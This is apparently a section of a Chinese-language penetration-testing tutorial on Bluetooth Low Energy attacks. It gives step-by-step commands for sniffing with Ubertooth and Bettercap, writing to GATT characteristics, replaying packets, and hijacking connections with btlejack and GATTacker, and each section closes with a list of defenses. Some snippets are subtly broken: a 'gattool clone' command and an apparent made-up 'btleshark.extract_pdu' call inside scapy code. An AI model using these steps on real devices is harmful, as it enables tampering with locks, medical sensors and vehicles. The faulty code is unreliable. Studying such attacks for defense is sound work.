# BLE 攻击技术

### 4.1 BLE Sniffing（流量嗅探）

```
BLE 流量嗅探：

工具选择：
├── Ubertooth One: 开源蓝牙抓包硬件
├── NRF52 Sniffer: Nordic 官方 BLE 抓包
├── TI CC2540: 低成本 BLE 抓包
├── Bettercap: 软件 BLE 扫描
└── Wireshark: 配合以上硬件分析流量

Ubertooth 抓包流程：
# 安装 Ubertooth 工具
apt install ubertooth

# 开始捕获 BLE 流量
ubertooth-btle -f -c capture.pcap

# 使用 Wireshark 分析
wireshark capture.pcap

# 跟踪连接
ubertooth-btle -f -t <access_address>

BLE 广播嗅探：
# 使用 Bettercap 扫描 BLE 广播
sudo bettercap -interface wlan0
> ble.recon on
> ble.show

# 过滤特定设备
> ble.recon on
> ble.enum <addr>

捕获内容分析：
├── 广播包（Advertising PDUs）
│   ├── ADV_IND: 连接广播
│   ├── ADV_SCAN_IND: 扫描响应
│   └── Manufacturer Data: 厂商自定义数据
├── 数据包（Data PDUs）
│   ├── LL Data: 链路层数据
│   ├── LL Control: 链路层控制
│   ├── ATT PDUs: 属性协议数据
│   └── SMP PDUs: 安全管理数据
└── 加密分析
    ├── 未加密连接: 可直接读取
    ├── 已加密连接: 需要密钥
    └── 配对过程可恢复密钥
```

### 4.2 GATT 篡改

```
GATT 服务篡改攻击：

攻击前提：
├── 目标设备 GATT 服务可写
├── 无认证或弱认证
├── 攻击者可建立 BLE 连接
└── 知道目标设备地址

攻击流程：

1. 发现目标设备
# 使用 Bettercap
> ble.recon on
> ble.show

2. 枚举 GATT 服务
# 使用 gatttool 或 bleah
gatttool -b <BD_ADDR> -I
> connect
> primary
> characteristics

# 或使用 Bettercap
> ble.enum <BD_ADDR>

3. 读取特征值
# 读取所有可读特征
gatttool -b <BD_ADDR> --char-read --handle=0x002a
gatttool -b <BD_ADDR> --char-read --uuid=2a00

4. 写入恶意数据
# 写入可写特征
gatttool -b <BD_ADDR> --char-write --handle=0x002a --value=DEADBEEF

# 使用 Bettercap
> ble.write <addr> <handle> <hex_data>

5. 启用通知
# 订阅通知
gatttool -b <BD_ADDR> --char-write-req \
  --handle=0x002b --value=0100

攻击场景：
├── IoT 设备控制（智能灯泡、门锁）
├── 健康设备数据篡改（心率、血糖）
├── 汽车无钥匙系统攻击
├── 工业传感器数据伪造
└── 固件更新注入

防御措施：
├── 实现特征值级别的认证
├── 使用加密连接
├── 实施写入认证
├── 关键操作需二次确认
└── 定期安全审计
```

### 4.3 重放攻击

```
BLE 重放攻击：

攻击原理：
├── 捕获合法的 BLE 数据包
├── 在后续时间重新发送
├── 如果协议无重放保护
├── 目标设备接受重放数据
└── 可能触发未授权操作

攻击条件：
├── 无序号/时间戳机制
├── 无消息认证码（MAC）
├── 或 MAC 无状态依赖
└── 连接未加密

攻击工具：
# 使用 Ubertooth 捕获
ubertooth-btle -f -c replay_capture.pcap

# 使用 btlejack 重放
# 安装
pip3 install btlejack

# 捕获并重放
btlejack -s <access_address>

# 自定义重放工具
from scapy.all import *
# 构造重放包
replay_pkt = btleshark.extract_pdu(capture.pcap, packet_num=42)
send(replay_pkt)

防御措施：
├── 使用 ATT 签名（CSRK）
├── 实现序列号机制
├── 使用时间戳
├── 加密连接
├── 配对后绑定
└── 关键操作需实时确认
```

### 4.4 BLE 中间人攻击

```
BLE 中间人（MITM）攻击：

Legacy 配对 MITM：
├── Legacy Just Works 无 MITM 保护
├── 攻击者可在配对时介入
├── 捕获 STK 协商过程
├── 恢复 TK（尤其 Just Works TK=0）
└── 解密后续通信

Secure Connections MITM：
├── 需要绕过用户确认
├── Numeric Comparison: 需要社工
├── Passkey: 需要 20 轮交互攻击
├── OOB: 需要攻破带外通道
└── 攻击难度显著增加

GATTacker 工具 MITM：

# 1. 克隆目标设备
gattool -b <target_addr> clone

# 2. 启动伪造设备
gattacker -s <cloned_data>

# 3. 等待客户端连接伪造设备
# 4. 中继流量到真实设备
# 5. 篡改/注入数据

btlejack 劫持：

# 1. 扫描活跃连接
btlejack -s

# 2. 劫持目标连接
btlejack -j <access_addr> -m <crc_init>

# 3. 注入数据包
btlejack -i <access_addr> --inject <pdu_hex>

防御措施：
├── 使用 Secure Connections 配对
├── 避免 Just Works 模式
├── 使用 OOB 配对
├── 加密所有数据传输
├── 实现应用层认证
└── 监控异常连接行为
```

---

---

